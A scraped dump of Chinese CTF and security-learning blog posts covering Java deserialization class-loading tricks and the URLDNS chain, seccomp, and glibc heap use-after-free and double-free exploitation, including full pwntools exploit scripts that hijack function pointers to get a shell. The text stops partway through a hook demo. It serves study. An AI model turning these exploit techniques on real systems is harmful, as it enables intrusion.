下面两个都能初始化类执行代码 //templatesImpl.getOutputProperties(); templatesImpl.newTransformer(); } public static void setFieldValue(Object obj,String fieldName,Object fieldValue) throws NoSuchFieldException, IllegalAccessException { Class\u0026lt;?\u0026gt; clazz = obj.getClass(); Field field = clazz.getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,fieldValue); } } URLClassLoader 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package demo; import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader; public class Test { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException { String URL_path = \u0026#34;C:\\\\Users\\\\26062\\\\Desktop\\\\个人文件\\\\SpringBoot\\\\unserialize\\\\target\\\\classes\\\\Test.class\u0026#34;; // url路径可以使用不同的协议，如http jar file URL url = new URL(\u0026#34;file:///\u0026#34; + URL_path); // 读取class文件 URLClassLoader ucl = new URLClassLoader(new URL[]{url}); // 从class文件加载类 Class\u0026lt;?\u0026gt; c = ucl.loadClass(\u0026#34;Test\u0026#34;); // 类实例化调用静态代码 c.newInstance(); } } BCEL ClassLoader 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package demo; import com.sun.org.apache.bcel.internal.Repository; import com.sun.org.apache.bcel.internal.classfile.JavaClass; import com.sun.org.apache.bcel.internal.classfile.Utility; import com.sun.org.apache.bcel.internal.util.ClassLoader; import java.io.IOException; public class Test { public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException { // 1.对恶意代码压缩成字符串 // 获取Test_对应的JavaClass对象 JavaClass jc = Repository.lookupClass(Test_.class); // 将JavaClass对象转换为字符串，true代表进行压缩 String code = Utility.encode(jc.getBytes(),true); System.out.println(code); // 2.使用com.sun.org.apache.bcel.internal.util.ClassLoader // 对含有$$BCEL$$的class_name进行特殊处理并进行动态加载 ClassLoader classLoader = new ClassLoader(); // 根据class_name创建JavaClass,然后获取其字节码，最后用defineClass加载类 Class\u0026lt;?\u0026gt; c = classLoader.loadClass(\u0026#34;$$BCEL$$\u0026#34; + code); c.newInstance(); } } 源码中的具体流程\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 // com.sun.org.apache.bcel.internal.util.ClassLoader继承自ClassLoader，重写了方法loadClass protected Class loadClass(String class_name, boolean resolve) throws ClassNotFoundException { Class cl = null; // 查找哈希表中键class_name所对应的值 if((cl=(Class)classes.get(class_name)) == null) { // 使用系统加载器加载类 for(int i=0; i \u0026lt; ignored_packages.length; i++) { if(class_name.startsWith(ignored_packages[i])) { cl = deferTo.loadClass(class_name); break; } } if(cl == null) { JavaClass clazz = null; // 检查class_name是否含有字符串$$BCEL$$ if(class_name.indexOf(\u0026#34;$$BCEL$$\u0026#34;) \u0026gt;= 0) // 创建JavaClass对象，JavaClass是对.class文件信息的封装 clazz = createClass(class_name); else { if ((clazz = repository.loadClass(class_name)) != null) { clazz = modifyClass(clazz); } else throw new ClassNotFoundException(class_name); } if(clazz != null) { // 从.class文件获取字节码 byte[] bytes = clazz.getBytes(); // defineClass加载字节码到类 cl = defineClass(class_name, bytes, 0, bytes.length); } else cl = Class.forName(class_name); } if(resolve) resolveClass(cl); } classes.put(class_name, cl); return cl; } URLdns EXP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 HashMap\u0026lt;URL,Integer\u0026gt; hashMap= new HashMap\u0026lt;URL,Integer\u0026gt;(); URL url = new URL(\u0026#34;https://www.google.com\u0026#34;); // 将URL的hashCode改为非-1的其它数 Class c = url.getClass(); Field hashCodeField = c.getDeclaredField(\u0026#34;hashCode\u0026#34;); hashCodeField.setAccessible(true); hashCodeField.set(url,114514); hashMap.put(url,1); // 设为-1触发dns请求 hashCodeField.set(url,-1); serialize(hashMap); unserialize(\u0026#34;ser.bin\u0026#34;); 链条 HashMap.readObject \u0026mdash;\u0026gt; HashMap.hash \u0026mdash;\u0026gt; URL.hashCode \u0026mdash;\u0026gt; URLStreamHandler.hashCode \u0026mdash;\u0026gt; getHostAddress\ngetHostAddress能够进行DNS查询，可以根据查询的回显判断是否触发URLdns\n","date":"2024-10-28T18:04:43+08:00","permalink":"https://Pwn3r4llD4ys.github.io/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/","title":"Java反序列化基础"},{"content":"seccomp seccomp（Secure Computing Mode） 是 Linux 内核的一项安全特性，用于限制进程可以执行的系统调用，从而减少攻击面。它通过指定允许哪些系统调用来防止进程执行未经授权的操作，是一种基于白名单的安全机制。\nseccomp有两种模式\n严格模式\n系统调用只剩下read、write、exit、sigreturn，其它的系统调用不被允许\n过滤模式\n通过BFP（Berkeley Packet Filter）定义对系统调用的允许或禁止\n严格模式 1 2 3 4 5 6 7 8 9 10 11 // seccomp.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/prctl.h\u0026gt; #include \u0026lt;linux/seccomp.h\u0026gt; int main() { prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT); // 启用seccomp的严格模式 char *buf = \u0026#34;hello world!\\n\u0026#34;; write(0,buf,0xc); printf(\u0026#34;%s\u0026#34;,buf); } printf(\u0026quot;%s\u0026quot;,buf);的运行被内核杀死，原因是库函数内部存在多个系统调用违反了严格模式的规则\n调试 printf \u0026ndash;\u0026gt; __vprintf_internal \u0026ndash;\u0026gt; _IO_file_xsputn \u0026ndash;\u0026gt; _IO_file_overflow \u0026ndash;\u0026gt; _IO_doallocbuf \u0026ndash;\u0026gt; _IO_file_doallocate \u0026ndash;\u0026gt; _IO_file_stat \u0026ndash;\u0026gt; SYS_newfstatat\n其中SYS_newfstatat这个系统调用被seccomp的严格模式状态内核禁止，从而导致进程被杀死\n过滤模式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // seccomp.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;seccomp.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main() { // 创建 seccomp 上下文 scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL); // 默认杀死进程 // 允许 read、write 系统调用 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0); // 加载 seccomp 规则 seccomp_load(ctx); // 测试允许的系统调用 write(1, \u0026#34;Hello, Seccomp!\\n\u0026#34;, 16); // 测试禁止的系统调用（例如 `open`，将被终止） open(\u0026#34;/etc/passwd\u0026#34;, 0); // 释放 seccomp 上下文 seccomp_release(ctx); return 0; } seccomp-tools 主要用于分析seccomp过滤器的工具\n应用 在ctf的题目中大多数用于禁用execve，这时候读取flag就只能构造shellcode进行orw\nSeccomp从0到1-安全客 - 安全资讯平台 (anquanke.com)\n","date":"2024-10-27T19:33:50+08:00","permalink":"https://Pwn3r4llD4ys.github.io/p/seccomp/","title":"Seccomp"},{"content":"uaf demo_0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; // 定义指向接收char*参数返回void的函数指针 typedef void (*func_ptr)(char *); void evil_fuc(char command[]) { system(command); } void echo(char content[]) { printf(\u0026#34;%s\u0026#34;,content); } int main() { // p1是指向func_ptr的指针数组 func_ptr *p1=(func_ptr*)malloc(4*sizeof(int)); printf(\u0026#34;p1 malloc addr: %p\\n\u0026#34;,p1); p1[3]=echo; p1[3](\u0026#34;hello world\\n\u0026#34;); // echo(\u0026#34;hello world\\n\u0026#34;); free(p1); p1[3](\u0026#34;hello again\\n\u0026#34;); // echo(\u0026#34;hello again\\n\u0026#34;); printf(\u0026#34;after free...\\n\u0026#34;); func_ptr *p2=(func_ptr*)malloc(4*sizeof(int)); // 申请到的还是p1 printf(\u0026#34;p1 malloc addr: %p\\n\u0026#34;,p1); printf(\u0026#34;p2 malloc addr: %p\\n\u0026#34;,p2); p2[3]=evil_fuc; p1[3](\u0026#34;whoami\u0026#34;); // evil_fuc(\u0026#34;whoami\u0026#34;); return 0; } 对于fastbin，堆管理器不会进行合并，两次申请的指针相同\n1 2 3 4 5 6 7 8 9 ┌──(root㉿kali)-[/mnt/…/pwn/heap/use_after_free/hitcon-training-hacknote] └─# ./demo p1 malloc addr: 0x5555555592a0 hello world hello again after free... p1 malloc addr: 0x5555555592a0 p2 malloc addr: 0x5555555592a0 root demo_1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main() { char* a = malloc(0x512); char* b = malloc(0x256); strcpy(a,\u0026#34;this is A\u0026#34;); printf(\u0026#34;chunk A addr:%p context:%s\\n\u0026#34;,a,a); free(a); printf(\u0026#34;chunk A addr:%p context:%s\\n\u0026#34;,a,a); // 输出乱码，内容变为fd bk char* c = malloc(0x500); // 申请的空间小于0x512保证c分配到a strcpy(c,\u0026#34;this is C\u0026#34;); printf(\u0026#34;chunk C addr:%p context:%s\\n\u0026#34;,c,c); printf(\u0026#34;chunk A addr:%p context:%s\\n\u0026#34;,a,a); } 1 2 3 4 5 6 ┌──(root㉿kali)-[/mnt/hgfs/pwn/heap/demo] └─# ./uaf chunk A addr:0x5555555592a0 context:this is A chunk A addr:0x5555555592a0 context: ���� chunk C addr:0x5555555592a0 context:this is C chunk A addr:0x5555555592a0 context:this is C hacknote 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; struct note { void (*printnote)(); char *content; }; struct note *notelist[5]; int count = 0; void print_note_content(struct note *this) { puts(this-\u0026gt;content); } void add_note() { int i; char buf[8]; int size; if (count \u0026gt; 5) { puts(\u0026#34;Full\u0026#34;); return; } for (i = 0; i \u0026lt; 5; i++) { if (!notelist[i]) { notelist[i] = (struct note *)malloc(sizeof(struct note)); if (!notelist[i]) { puts(\u0026#34;Alloca Error\u0026#34;); exit(-1); } notelist[i]-\u0026gt;printnote = print_note_content; // 添加节点给函数指针赋值，劫持为函数magic printf(\u0026#34;Note size :\u0026#34;); read(0, buf, 8); size = atoi(buf); notelist[i]-\u0026gt;content = (char *)malloc(size); if (!notelist[i]-\u0026gt;content) { puts(\u0026#34;Alloca Error\u0026#34;); exit(-1); } printf(\u0026#34;Content :\u0026#34;); read(0, notelist[i]-\u0026gt;content, size); puts(\u0026#34;Success !\u0026#34;); count++; break; } } } void del_note() { char buf[4]; int idx; printf(\u0026#34;Index :\u0026#34;); read(0, buf, 4); idx = atoi(buf); if (idx \u0026lt; 0 || idx \u0026gt;= count) { puts(\u0026#34;Out of bound!\u0026#34;); _exit(0); } if (notelist[idx]) { free(notelist[idx]-\u0026gt;content); // 删除节点没有将指针置空存在uaf漏洞 free(notelist[idx]); puts(\u0026#34;Success\u0026#34;); } } void print_note() { char buf[4]; int idx; printf(\u0026#34;Index :\u0026#34;); read(0, buf, 4); idx = atoi(buf); if (idx \u0026lt; 0 || idx \u0026gt;= count) { puts(\u0026#34;Out of bound!\u0026#34;); _exit(0); } if (notelist[idx]) { notelist[idx]-\u0026gt;printnote(notelist[idx]); } } void magic() { system(\u0026#34;cat flag\u0026#34;); } void menu() { puts(\u0026#34;----------------------\u0026#34;); puts(\u0026#34; HackNote \u0026#34;); puts(\u0026#34;----------------------\u0026#34;); puts(\u0026#34; 1. Add note \u0026#34;); puts(\u0026#34; 2. Delete note \u0026#34;); puts(\u0026#34; 3. Print note \u0026#34;); puts(\u0026#34; 4. Exit \u0026#34;); puts(\u0026#34;----------------------\u0026#34;); printf(\u0026#34;Your choice :\u0026#34;); }; int main() { setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); char buf[4]; while (1) { menu(); read(0, buf, 4); switch (atoi(buf)) { case 1: add_note(); break; case 2: del_note(); break; case 3: print_note(); break; case 4: exit(0); break; default: puts(\u0026#34;Invalid choice\u0026#34;); break; } } return 0; } exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 from pwn import * r = process(\u0026#39;./hacknote\u0026#39;) context.log_level = \u0026#39;error\u0026#39; def addnote(size, content): r.recvuntil(\u0026#34;:\u0026#34;) r.sendline(\u0026#34;1\u0026#34;) r.recvuntil(\u0026#34;:\u0026#34;) r.sendline(str(size)) r.recvuntil(\u0026#34;:\u0026#34;) r.sendline(content) def delnote(idx): r.recvuntil(\u0026#34;:\u0026#34;) r.sendline(\u0026#34;2\u0026#34;) r.recvuntil(\u0026#34;:\u0026#34;) r.sendline(str(idx)) def printnote(idx): r.recvuntil(\u0026#34;:\u0026#34;) r.sendline(\u0026#34;3\u0026#34;) r.recvuntil(\u0026#34;:\u0026#34;) r.sendline(str(idx)) gdb.attach(r) magic = 0x08048986 addnote(32, \u0026#34;aaaa\u0026#34;) # note0 addnote(32, \u0026#34;ddaa\u0026#34;) # note1 delnote(0) delnote(1) addnote(8, p32(magic)) # 申请较小字节，保证复用的是note结构体而不是note-\u0026gt;context printnote(0) # 调用magic r.interactive() 详解 1 2 addnote(32, \u0026#34;aaaa\u0026#34;) # note0 addnote(32, \u0026#34;ddaa\u0026#34;) # note1 每创建一个note就会malloc两次，第一个chunk是结构体，第二个chunk用于存放context(大小可控)，创建两个note会有如下chunk\n1 2 3 4 5 6 7 pwndbg\u0026gt; parseheap addr prev size status fd bk 0x908a008 0x0 0x190 Used None None 0x908a198 0x0 0x10 Used None None 0x908a1a8 0x0 0x30 Used None None 0x908a1d8 0x0 0x10 Used None None 0x908a1e8 0x0 0x30 Used None None 0x908a008是初始化的chunk，并不是手动malloc产生的的chunk 0x908a198 \u0026ndash;\u0026gt; note0 0x908a1a8 \u0026ndash;\u0026gt; note0 -\u0026gt; context 0x908a1d8 \u0026ndash;\u0026gt; note1 0x908a1e8 \u0026ndash;\u0026gt; note1 -\u0026gt; context 1 2 3 4 delnote(0) delnote(1) addnote(8, p32(magic)) # 申请的字节小于32确保复用note1 两个note被free后又创建note2，根据fastbins的分配机制会把0x939f1d8分配给note2，把0x939f198分配给note2-\u0026gt;context\n1 2 3 4 5 6 7 pwndbg\u0026gt; parseheap addr prev size status fd bk 0x939f008 0x0 0x190 Used None None 0x939f198 0x0 0x10 Used None None 0x939f1a8 0x0 0x30 Freed 0x939f None 0x939f1d8 0x0 0x10 Used None None 0x939f1e8 0x0 0x30 Freed 0x939622f None 重点的来了！！！\n前面提到context可控，此时note2-\u0026gt;context正好分配到note0上，因为note0在free后没有设置为NULL导致note0的指针仍然可用\n调用note0的print_note_content就相当于把note2-\u0026gt;context的内容当作函数地址，只需要把该地址改为magic，即可成功利用后门\n之前在addnote(8, p32(magic))这里卡了好久，结合源码和 fastbins 才理清漏洞利用思路，实在不容易\u0026hellip;\u0026hellip;\n","date":"2024-10-27T19:30:51+08:00","permalink":"https://Pwn3r4llD4ys.github.io/p/uaf/","title":"Uaf"},{"content":"double free 对于fastbins而言，一个chunk如果free两次，那么该单向链表中就存在两个相同的chunk，由于之前的两次free此时malloc的chunk的状态是free状态的。有什么坏处呢？处于free状态的chunk有fd和bk指针，通过篡改这两个指针就可以欺骗堆管理器返回任意地址的chunk，也就有了任意地址写的漏洞。\ndemo 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { // fastbins int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); printf(\u0026#34;chunk a addr: %p\\n\u0026#34;,a); printf(\u0026#34;chunk b addr: %p\\n\u0026#34;,b); printf(\u0026#34;chunk c addr: %p\\n\u0026#34;,c); free(a); free(b); free(a); printf(\u0026#34;1st malloc: %p\\n\u0026#34;,malloc(8)); printf(\u0026#34;2nd malloc: %p\\n\u0026#34;,malloc(8)); printf(\u0026#34;3rd malloc: %p\\n\u0026#34;,malloc(8)); return 0; } 这段代码依赖老版本的libc，使用docker构建ubuntu镜像\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 # Dockerfile # 基于 Ubuntu 16.04 FROM ubuntu:16.04 # 更新包管理器并安装必要的工具 RUN apt-get update \u0026amp;\u0026amp; \\ apt-get install -y \\ build-essential \\ wget \\ vim \\ git \\ libc6=2.23-0ubuntu11.3 \\ libc6-dev=2.23-0ubuntu11.3 # 安装指定版本的 libc 库和其他依赖 RUN apt-get install -y \\ gcc \\ g++ \\ make # 创建工作目录 WORKDIR /home/demo # 将代码复制到 Docker 容器中 COPY ./demo.c /home/demo # 设置环境变量，使得运行程序时使用指定版本的 libc ENV LD_LIBRARY_PATH=/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu # 默认启动 bash shell CMD [\u0026#34;/bin/bash\u0026#34;] 1 2 docker build -t ubuntu-16.04 . docker exec -it ubuntu-16.04 bash 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 root@c2009cd551df:/home/demo# cat /etc/os-release NAME=\u0026#34;Ubuntu\u0026#34; VERSION=\u0026#34;16.04.7 LTS (Xenial Xerus)\u0026#34; ID=ubuntu ID_LIKE=debian PRETTY_NAME=\u0026#34;Ubuntu 16.04.7 LTS\u0026#34; VERSION_ID=\u0026#34;16.04\u0026#34; HOME_URL=\u0026#34;http://www.ubuntu.com/\u0026#34; SUPPORT_URL=\u0026#34;http://help.ubuntu.com/\u0026#34; BUG_REPORT_URL=\u0026#34;http://bugs.launchpad.net/ubuntu/\u0026#34; VERSION_CODENAME=xenial UBUNTU_CODENAME=xenial root@c2009cd551df:/home/demo# gcc demo.c -o demo root@c2009cd551df:/home/demo# ./demo chunk a addr: 0x602010 chunk b addr: 0x602030 chunk c addr: 0x602050 1st malloc: 0x602010 # malloc的chunk是free状态 2nd malloc: 0x602030 3rd malloc: 0x602010 samsara main 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 void __fastcall __noreturn main(int a1, char **a2, char **a3) { int offset_v3; // ebx int choice; // [rsp+Ch] [rbp-44h] BYREF int offset_v5; // [rsp+10h] [rbp-40h] BYREF __gid_t rgid; // [rsp+14h] [rbp-3Ch] __int64 addr; // [rsp+18h] [rbp-38h] BYREF __int64 v8; // [rsp+20h] [rbp-30h] __int64 v9; // [rsp+28h] [rbp-28h] BYREF __int64 v10[4]; // [rsp+30h] [rbp-20h] BYREF v10[1] = __readfsqword(0x28u); // 读取canary setvbuf(stdout, 0LL, 2, 0LL); rgid = getegid(); setresgid(rgid, rgid, rgid); v8 = 0LL; puts(\u0026#34;After defeating the Demon Dragon, you turned yourself into the Demon Dragon...\u0026#34;); while ( 2 ) { v10[0] = 0LL; menu(); scanf(\u0026#34;%d\u0026#34;, \u0026amp;choice); switch ( choice ) { case 1: if ( num_dword_20202C \u0026gt;= 7 ) { puts(\u0026#34;You can\u0026#39;t capture more people.\u0026#34;); } else { offset_v3 = num_dword_20202C; // 偏移量 *((_QWORD *)\u0026amp;chunk_ptr_unk_202040 + offset_v3) = malloc(8uLL); ++num_dword_20202C; puts(\u0026#34;Captured.\u0026#34;); } continue; case 2: puts(\u0026#34;Index:\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;offset_v5); free(*((void **)\u0026amp;chunk_ptr_unk_202040 + offset_v5));// 两次调用进行double free或者UAF puts(\u0026#34;Eaten.\u0026#34;); continue; case 3: puts(\u0026#34;Index:\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;offset_v5); puts(\u0026#34;Ingredient:\u0026#34;); scanf(\u0026#34;%llu\u0026#34;, v10); **((_QWORD **)\u0026amp;chunk_ptr_unk_202040 + offset_v5) = v10[0];// 修改数据 puts(\u0026#34;Cooked.\u0026#34;); continue; case 4: printf(\u0026#34;Your lair is at: %p\\n\u0026#34;, \u0026amp;addr); // 查看地址 continue; case 5: puts(\u0026#34;Which kingdom?\u0026#34;); scanf(\u0026#34;%llu\u0026#34;, \u0026amp;v9); addr = v9; // 修改地址 puts(\u0026#34;Moved.\u0026#34;); continue; case 6: if ( v8 == 0xDEADBEEFLL ) system(\u0026#34;/bin/sh\u0026#34;); // 后门 puts(\u0026#34;Now, there\u0026#39;s no Demon Dragon anymore...\u0026#34;); goto LABEL_13; default: LABEL_13: exit(1); } } } menu 1 2 3 4 5 6 7 8 9 10 11 12 13 14 unsigned __int64 menu() { unsigned __int64 v1; // [rsp+8h] [rbp-8h] v1 = __readfsqword(0x28u); puts(\u0026#34;1. Capture a human\u0026#34;); // malloc puts(\u0026#34;2. Eat a human\u0026#34;); // free puts(\u0026#34;3. Cook a human\u0026#34;); // chunk_ptr = NULL puts(\u0026#34;4. Find your lair\u0026#34;); // show addr puts(\u0026#34;5. Move to another kingdom\u0026#34;); // change addr puts(\u0026#34;6. Commit suicide\u0026#34;); // getshell printf(\u0026#34;choice \u0026gt; \u0026#34;); return __readfsqword(0x28u) ^ v1; } 思路 double free可以对任意地址写，可以考虑把chunk申请到v8然后修改数据进行getshell；如果没有后门可以malloc到got表进行函数劫持\n结合case4 case5和上面的变量可知v8 = v9 - 8，先调用case5再调用case4就可以知道v8的地址\n1 2 3 4 5 6 7 8 int offset_v3; // ebx int choice; // [rsp+Ch] [rbp-44h] BYREF int offset_v5; // [rsp+10h] [rbp-40h] BYREF __gid_t rgid; // [rsp+14h] [rbp-3Ch] __int64 addr; // [rsp+18h] [rbp-38h] BYREF __int64 v8; // [rsp+20h] [rbp-30h] __int64 v9; // [rsp+28h] [rbp-28h] BYREF __int64 v10[4]; // [rsp+30h] [rbp-20h] BYREF 1 2 3 4 5 6 7 8 9 case 4: printf(\u0026#34;Your lair is at: %p\\n\u0026#34;, \u0026amp;addr); // 查看地址 continue; case 5: puts(\u0026#34;Which kingdom?\u0026#34;); scanf(\u0026#34;%llu\u0026#34;, \u0026amp;v9); addr = v9; // 修改地址 puts(\u0026#34;Moved.\u0026#34;); continue; chunk_0的fd篡改为v8地址\nfastbin链表变成如下结构，只需再malloc两次就可以可以在栈上申请chunk\n栈区构造chunk，虽然pre_szie和size是没有意义的，但是v8的地址在chunk的数据区，后面直接getshell\nv8的地址在0x7fffffffe1a0是没有想到的，翻看伪代码都感觉不太可能，要不是动态调试还不一定能发现，还是要多动静结合\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 from pwn import * context.arch = \u0026#39;amd64\u0026#39; context.os = \u0026#39;linux\u0026#39; context.log_level = \u0026#39;debug\u0026#39; context.terminal = [\u0026#34;tmux\u0026#34;,\u0026#34;splitw\u0026#34;,\u0026#34;-v\u0026#34;] io = process(\u0026#34;./copy_samsara\u0026#34;) sla = lambda delim,data : io.sendlineafter(str(delim).encode(), str(data).encode()) rcu = lambda delim : io.recvuntil(str(delim).encode()) def add(): sla(\u0026#34;choice \u0026gt;\u0026#34;, 1) def delete(index): sla(\u0026#34;choice \u0026gt;\u0026#34;, 2) sla(\u0026#34;:\\n\u0026#34;, index) def edit(index, data): sla(\u0026#34;choice \u0026gt;\u0026#34;, 3) sla(\u0026#34;:\\n\u0026#34;, index) sla(\u0026#34;:\\n\u0026#34;, data) def show(): sla(\u0026#34;choice \u0026gt;\u0026#34;, 4) # Your lair is at: 0x7fffffffe278 rcu(\u0026#39;0x\u0026#39;) addr = int(rcu(\u0026#39;\\n\u0026#39;), 16) success(f\u0026#34;addr:{hex(addr)}\u0026#34;) return addr def move(dest): sla(\u0026#34;choice \u0026gt;\u0026#34;, 5) sla(\u0026#34;?\\n\u0026#34;, dest) def getshell(): sla(\u0026#34;choice \u0026gt;\u0026#34;, 6) def dbg(): gdb.attach(io) pause() add() # chunk_0 add() # chunk_1 add() # chunk_2 # double free delete(0) # a delete(1) # b delete(0) # c add() # chunk_3 \u0026lt;-\u0026gt; c add() # chunk_4 \u0026lt;-\u0026gt; b move(0x20) fake_chunk = show() - 8 # fake_chunk edit(3, fake_chunk) add() # chunk_5 \u0026lt;-\u0026gt; a add() # chunk_6 -\u0026gt; stack_fake_chunk edit(6, 0xdeadbeef) # v8 == 0xdeadbeef getshell() io.interactive() ACTF_2019_message main 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 void __fastcall __noreturn main(__int64 a1, char **a2, char **a3) { int choice; // eax char buf[24]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 canary; // [rsp+28h] [rbp-8h] canary = __readfsqword(0x28u); init_sub_400911(a1, a2, a3); while ( 1 ) { while ( 1 ) { while ( 1 ) { menu(); read(0, buf, 8uLL); choice = atoi(buf); if ( choice != 2 ) break; delete(); } if ( choice \u0026gt; 2 ) break; if ( choice != 1 ) goto LABEL_13; add(); } if ( choice == 3 ) { edit(); } else { if ( choice != 4 ) LABEL_13: handler((int)buf); show(); } } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 // switch版 void __fastcall __noreturn main(__int64 a1, char **a2, char **a3) { int choice; // eax char buf[24]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 canary; // [rsp+28h] [rbp-8h] canary = __readfsqword(0x28u); init_sub_400911(a1, a2, a3); while (1) { menu(); read(0, buf, 8uLL); choice = atoi(buf); switch (choice) { case 1: add(); break; case 2: delete(); break; case 3: edit(); break; case 4: show(); break; default: handler((int)buf); break; } } } delete 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 unsigned __int64 sub_400B73() { unsigned int index; // [rsp+Ch] [rbp-24h] char buf[24]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v3; // [rsp+28h] [rbp-8h] v3 = __readfsqword(0x28u); if ( num_dword_60204C \u0026lt;= 0 ) { puts(\u0026#34;There is no message in system\u0026#34;); } else { puts(\u0026#34;Please input index of message you want to delete:\u0026#34;); read(0, buf, 8uLL); index = atoi(buf); if ( index \u0026gt; 9 ) { puts(\u0026#34;Index is invalid!\u0026#34;); } else { free(*(void **)\u0026amp;dword_602060[4 * index + 2]); dword_602060[4 * index] = 0; // 这里只是把长度置0，没有把堆的指针置0，可能存在uaf或者double free --num_dword_60204C; } } return __readfsqword(0x28u) ^ v3; } hook 堆的hook函数主要用于在动态内存管理中自定义分配和释放内存，hook相当于给函数套了一个外壳，以malloc为例，若__malloc_hook这个函数指针不为NULL时，调用malloc时glibc会转移到__malloc_hook，这时调用malloc就相当于调用__malloc_hook，__malloc_hook里面可以补充在malloc之前或者之后的代码逻辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /* Forward declarations. */ static void *malloc_hook_ini (size_t sz, const void *caller) __THROW; static void *realloc_hook_ini (void *ptr, size_t sz, const void *caller) __THROW; static void *memalign_hook_ini (size_t alignment, size_t sz, const void *caller) __THROW; void weak_variable (*__malloc_initialize_hook) (void) = NULL; void weak_variable (*__free_hook) (void *__ptr, const void *) = NULL; void *weak_variable (*__malloc_hook) (size_t __size, const void *) = malloc_hook_ini; // __malloc_hook初始化 void *weak_variable (*__realloc_hook) (void *__ptr, size_t __size, const void *) = realloc_hook_ini; void *weak_variable (*__memalign_hook) (size_t __alignment, size_t __size, const void *) = memalign_hook_ini; void weak_variable (*__after_morecore_hook) (void) = NULL; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 static void * malloc_hook_ini (size_t sz, const void *caller) { __malloc_hook = NULL; ptmalloc_init (); return __libc_malloc (sz); } static void * realloc_hook_ini (void *ptr, size_t sz, const void *caller) { __malloc_hook = NULL; __realloc_hook = NULL; ptmalloc_init (); return __libc_realloc (ptr, sz); } static void * memalign_hook_ini (size_t alignment, size_t sz, const void *caller) { __memalign_hook = NULL; ptmalloc_init (); return __libc_memalign (alignment, sz); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 // hook函数演示代码 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;malloc.h\u0026gt; void *my_malloc_hook(size_t size, const void *caller) { printf(\u0026#34;before malloc\\n\u0026#34;); void *ptr = malloc(size); printf(\u0026#34;after malloc\\n\u0026#34;); return ptr; } void my_free_hook(void *ptr, const void *caller) { printf(\u0026#34;before free\\n\u0026#34;); free(ptr); 